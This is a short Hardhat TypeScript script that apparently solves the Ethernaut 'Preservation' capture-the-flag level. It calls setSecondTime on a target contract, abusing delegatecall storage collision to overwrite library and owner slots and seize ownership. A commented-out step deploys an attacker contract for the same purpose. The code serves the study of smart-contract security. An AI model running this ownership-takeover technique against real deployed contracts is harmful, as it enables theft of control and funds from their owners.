// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
// When running the script with `hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
import { parseEther, parseUnits } from 'ethers/lib/utils';
import { ethers } from 'hardhat';


async function main(): Promise<void> {
  // Hardhat always runs the compile task when running scripts through it.
  // If this runs in a standalone fashion you may want to call compile manually
  // to make sure everything is compiled
  // await run("compile");
  // We get the contract to deploy
  const [deployer] = await ethers.getSigners();
  const preservationAddress = "0x3F1B9E9C78ac27539F1cf5177d0d26fa3F18A9Ff"
  console.log(deployer.address);

  const PreservationFactory = await ethers.getContractFactory("Preservation");
  const preservation = PreservationFactory.attach(preservationAddress);  
  
  console.log((await preservation.timeZone2Library()))
  console.log((await preservation.owner()))

  /*
  const PreservationSolvedFactory = await ethers.getContractFactory("PreservationSolved");
  const preservationSolved = await PreservationSolvedFactory.deploy();
  await preservationSolved.deployed()
  console.log('preservationSolved deployed to: ', preservationSolved.address);

  // setting the secondLibrary as preservationSolved
  const firstTime = ethers.BigNumber.from(preservationSolved.address)
  let tx = await preservation.setSecondTime(firstTime)
  console.log(tx)
  let receipt = await tx.wait()
  console.log(receipt)

  console.log((await preservation.timeZone2Library()))
  
  */

  // changing the owner at slot3
  const firstTime = ethers.BigNumber.from(deployer.address)
  let tx = await preservation.setSecondTime(firstTime)
  console.log(tx)
  let receipt = await tx.wait()
  console.log(receipt)

  console.log((await preservation.timeZone2Library()))
  console.log((await preservation.owner()))
  
} 

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error: Error) => {
    console.error(error);
    process.exit(1);
  });
